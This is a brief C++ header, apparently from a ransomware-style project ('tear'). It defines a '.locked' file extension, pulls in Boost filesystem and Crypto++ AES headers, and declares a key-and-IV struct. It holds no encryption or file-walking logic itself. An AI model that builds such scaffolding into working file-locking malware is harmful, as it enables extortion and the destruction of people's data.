#define DEBUG

#ifndef TEAR_H
#define TEAR_H

#define EMPTY ""
#define LOCKED_EXTENSION ".locked"

#include <boost/filesystem/operations.hpp>

#include <cryptopp/default.h>
#include <cryptopp/osrng.h>
#include <cryptopp/cryptlib.h>
#include <cryptopp/hex.h>
#include <cryptopp/filters.h>
#include <cryptopp/files.h>
#include <cryptopp/aes.h>
#include <cryptopp/ccm.h>

#define KEY_LEN CryptoPP::AES::DEFAULT_KEYLENGTH
#define IV_LEN CryptoPP::AES::BLOCKSIZE

struct crypt_data {
	byte key[KEY_LEN];
	byte iv[IV_LEN];
};

#endif
